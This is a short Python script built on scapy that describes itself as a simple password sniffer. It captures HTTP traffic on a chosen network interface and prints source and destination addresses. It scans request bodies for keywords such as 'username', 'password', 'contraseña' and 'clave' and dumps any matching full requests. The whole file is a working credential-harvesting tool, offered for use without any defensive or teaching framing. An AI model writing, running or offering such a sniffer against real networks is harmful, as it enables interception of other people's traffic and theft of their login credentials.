from scapy.all import *
from scapy.layers.inet import IP
from scapy_http import http
import argparse

parse = argparse.ArgumentParser(
    description="A simple password sniffer that captures HTTP POST requests."
)
parse.add_argument(
    "-i", "--interface", type=str, required=True, help="Network interface to sniff on"
)
args = parse.parse_args()

wordlist = [
    "username",
    "user",
    "usuario",
    "pass",
    "password",
    "contraseña",
    "clave",
    "clave123",
    "123456",
]


def capture_http(packet):
    if packet.haslayer(http.HTTPRequest):
        print(
            f"HTTP Request: {packet[IP].src} -> {packet[IP].dst}\n Dominio: {str(packet[http.HTTPRequest].Host.decode())}"
        )
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors="ignore")
            for word in wordlist:
                if word in payload.lower():
                    print(f"Possible password found: {word} in {payload}")
                    print(f"Full HTTP Request: {payload}")


def main():
    # Sniff packets on the network
    print("Starting packet sniffing...")
    if args.interface:
        sniff(iface=args.interface, store=False, prn=capture_http)


if __name__ == "__main__":
    main()
